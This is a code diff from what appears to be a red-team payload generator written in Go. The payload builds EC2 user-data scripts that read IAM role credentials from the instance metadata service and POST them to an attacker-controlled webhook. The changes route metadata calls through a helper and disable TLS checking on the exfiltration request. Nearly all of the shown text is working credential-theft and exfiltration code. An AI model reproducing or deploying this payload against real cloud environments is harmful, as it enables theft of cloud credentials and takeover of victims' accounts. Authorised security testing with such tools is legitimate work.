@@ -23,7 +23,7 @@ func (p *ExfilHTTPSPayload) GetName() string {
 }
 
 func (p *ExfilHTTPSPayload) GetDescription() string {
-	return "Exfiltrate EC2 instance role credentials to attacker-controlled HTTPS endpoint"
+	return "Exfiltrate instance role credentials to an attacker-controlled HTTPS endpoint via EC2 user-data"
 }
 
 func (p *ExfilHTTPSPayload) GetTags() []string {
@@ -69,10 +69,10 @@ func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, err
 	if includeMetadata {
 		metadataCode = `
 # Collect additional metadata
-INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
-HOSTNAME=$(curl -s http://169.254.169.254/latest/meta-data/hostname)
-REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
-AVAILABILITY_ZONE=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
+INSTANCE_ID=$(imds_get /latest/meta-data/instance-id)
+HOSTNAME=$(imds_get /latest/meta-data/hostname)
+REGION=$(imds_get /latest/meta-data/placement/region)
+AVAILABILITY_ZONE=$(imds_get /latest/meta-data/placement/availability-zone)
 
 METADATA_JSON=$(cat <<METADATA
 {
@@ -98,9 +98,11 @@ echo ""
 echo "Waiting for instance role to be available..."
 sleep 15
 
+%s
+
 # Get the role name attached to this instance
 echo "Discovering attached IAM role..."
-ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+ROLE_NAME=$(imds_get /latest/meta-data/iam/security-credentials/)
 
 if [ -z "$ROLE_NAME" ]; then
     echo "ERROR: No IAM role attached to this instance"
@@ -111,7 +113,7 @@ echo "Found role: $ROLE_NAME"
 
 # Retrieve temporary credentials from instance metadata service
 echo "Retrieving temporary credentials..."
-CREDENTIALS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
+CREDENTIALS=$(imds_get /latest/meta-data/iam/security-credentials/$ROLE_NAME)
 
 if [ -z "$CREDENTIALS" ]; then
     echo "ERROR: Could not retrieve credentials"
@@ -132,7 +134,7 @@ PAYLOAD
 
 # Send credentials to webhook
 echo "Exfiltrating credentials to webhook..."
-RESPONSE=$(curl -s -w "%%{http_code}" -o /tmp/webhook_response.txt \
+RESPONSE=$(curl -sk -w "%%{http_code}" -o /tmp/webhook_response.txt \
   -X POST \
   -H "User-Agent: %s" \
   -H "Content-Type: application/json" \
@@ -151,7 +153,7 @@ else
 fi
 
 echo "Exfiltration complete"
-`, webhookURL, metadataCode, func() string {
+`, webhookURL, IMDSHelperSnippet(), metadataCode, func() string {
 		if includeMetadata {
 			return `,
   "metadata": $METADATA_JSON`
